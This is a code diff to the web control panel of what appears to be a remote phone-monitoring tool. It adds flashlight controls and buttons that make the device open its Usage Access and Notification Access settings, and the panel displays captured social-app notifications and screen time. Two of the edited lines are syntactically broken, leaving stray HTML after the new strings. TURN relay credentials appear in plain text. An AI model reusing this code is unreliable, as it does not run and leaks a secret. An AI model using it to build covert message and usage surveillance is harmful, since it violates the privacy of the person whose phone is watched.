@@ -577,10 +577,8 @@
 
     <div class="section">
         <div class="section-title">Flashlight</div>
-        <button onclick="sendCommand('FLASH_ON')"><span>🔦</span> Flash On</button>
-        <button onclick="sendCommand('FLASH_OFF')"><span>🔦</span> Flash Off</button>
-        <button onclick="sendCommand('FLASH_BLINK', { duration: 10000, interval: 500 })"><span>✨</span> Blink 10s</button>
-        <button onclick="sendCommand('FLASH_TIMED', { duration: 5000 })"><span>⏱️</span> Flash 5s</button>
+        <button onclick="toggleFlash()" id="flashBtn"><span>🔦</span> <span id="flashStatus">Flash Off</span></button>
+        <button onclick="blinkFlash()"><span>✨</span> Blink (enter seconds)</button>
     </div>
 
     <div class="section">
@@ -680,7 +678,17 @@
         { urls: "turn:standard.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
         { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
     ];
-
+    //---FLASHLIGHT OPERATION---//
+    let flashOn = false;
+        function toggleFlash() {
+            flashOn = !flashOn;
+            sendCommand(flashOn ? 'FLASH_ON' : 'FLASH_OFF');
+            document.getElementById('flashStatus').innerText = flashOn ? 'Flash On' : 'Flash Off';
+        }
+        function blinkFlash() {
+            let seconds = prompt("Blink duration (seconds):", "5");
+            if (seconds) sendCommand('FLASH_BLINK', { duration: parseInt(seconds)*1000, interval: 500 });
+        }
     // ---------- SIGNALING OVER WEBSOCKET ----------
     function sendSignalingMessage(msg) {
         if (!ws || ws.readyState !== WebSocket.OPEN) {
@@ -1861,7 +1869,9 @@
 
     // ── Screen Time ───────────────────────────────────────────────────────────
     function showAppUsagePanel() {
-        panel.innerHTML = '<h3>📊 Screen Time</h3><p style="color:#999;font-size:12px">⚠️ Requires Usage Access permission on device. Go to <b>Settings → Apps → Special App Access → Usage Access</b> and grant access.</p>';
+        panel.innerHTML = '<h3>📊 Screen Time</h3>' +
+    '<p style="color:#999;font-size:12px">⚠️ Requires Usage Access permission on device.</p>' +
+    '<button onclick="sendCommand(\'OPEN_USAGE_SETTINGS\')">Open Usage Access Settings</button>' +<p style="color:#999;font-size:12px">⚠️ Requires Usage Access permission on device. Go to <b>Settings → Apps → Special App Access → Usage Access</b> and grant access.</p>';
         const btnRow = document.createElement('div');
         btnRow.style.cssText = 'display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap';
         [['Today', 1], ['7 Days', 7], ['30 Days', 30]].forEach(function(item) {
@@ -1914,7 +1924,9 @@
     function displayNotifications(data) {
         panel.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
-            panel.innerHTML = '<h3>🔔 Social Messages</h3><p style="color:#999;margin-top:16px">No messages yet.<br>Enable Notification Access: <b>Settings → Apps → Special App Access → Notification Access</b></p>';
+            panel.innerHTML = '<h3>🔔 Social Messages</h3>' +
+    '<p style="color:#999">No messages yet.<br>Enable Notification Access:</p>' +
+    '<button onclick="sendCommand(\'OPEN_NOTIFICATION_SETTINGS\')">Open Notification Access Settings</button>';<p style="color:#999;margin-top:16px">No messages yet.<br>Enable Notification Access: <b>Settings → Apps → Special App Access → Notification Access</b></p>';
             return;
         }
         const hdr = document.createElement('div');
